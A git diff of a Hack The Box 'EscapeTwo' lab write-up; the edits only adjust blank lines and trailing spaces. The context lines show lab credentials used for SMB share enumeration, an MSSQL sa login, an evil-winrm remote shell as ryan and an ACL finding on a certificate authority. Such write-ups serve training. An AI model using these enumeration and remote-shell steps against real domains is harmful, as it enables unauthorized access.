@@ -15,8 +15,11 @@ description: Escape two is an assumed breach scenario where we start of as Rose.
 image: https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png
 cssclass: custom_htb
 ---
+
 ![Escape2](https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png)
+
 # Nmap
+
 Our port scan finds the following ports open:
 
 ```
@@ -55,20 +58,21 @@ Since SMB is running `445/tcp open microsoft-ds`, enumerating SMB shares:
 ```bash
 $nxc smb sequel.htb -u Rose -p KxEPkKe6R8su --shares
 SMB         10.129.137.51  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
-SMB         10.129.137.51  445    DC01             [+] sequel.htb\Rose:KxEPkKe6R8su 
+SMB         10.129.137.51  445    DC01             [+] sequel.htb\Rose:KxEPkKe6R8su
 SMB         10.129.137.51  445    DC01             [*] Enumerated shares
 SMB         10.129.137.51  445    DC01             Share           Permissions     Remark
 SMB         10.129.137.51  445    DC01             -----           -----------     ------
-SMB         10.129.137.51  445    DC01             Accounting Department READ            
+SMB         10.129.137.51  445    DC01             Accounting Department READ
 SMB         10.129.137.51  445    DC01             ADMIN$                          Remote Admin
 SMB         10.129.137.51  445    DC01             C$                              Default share
 SMB         10.129.137.51  445    DC01             IPC$            READ            Remote IPC
-SMB         10.129.137.51  445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.129.137.51  445    DC01             SYSVOL          READ            Logon server share 
-SMB         10.129.137.51  445    DC01             Users           READ  
+SMB         10.129.137.51  445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.137.51  445    DC01             SYSVOL          READ            Logon server share
+SMB         10.129.137.51  445    DC01             Users           READ
 ```
 
 Rose has read access to `Accounting Department` share, enumerating the share we find:
+
 - `accounting_2024.xlsx`
 - `accounts.xlsx`
 
@@ -87,13 +91,14 @@ smb: \> ls
 File formats from microsoft office are all just zip files:
 
 ```bash
-$file accounts.xlsx 
+$file accounts.xlsx
 accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
-$file accounting_2024.xlsx 
+$file accounting_2024.xlsx
 accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
 ```
 
 ## accounts.xlsx
+
 contents of `accounts.xlsx`
 
 ```bash
@@ -137,6 +142,7 @@ MSSQL       10.129.137.51  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (P
 ```
 
 # User
+
 user `SA` running on the box as `sql_svc` has command execution
 
 ```bash
@@ -185,13 +191,13 @@ Ryan is part of the Remote Managers group so we can access the machine through W
 
 ```bash
 $evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3
-                                        
+
 Evil-WinRM shell v3.7
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv
 
@@ -208,6 +214,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 Just like that we have User!
 
 # Root
+
 cheking for ryan's ACL permissions we find WriteOwner for `Certification Authority`:
 
 ```bash
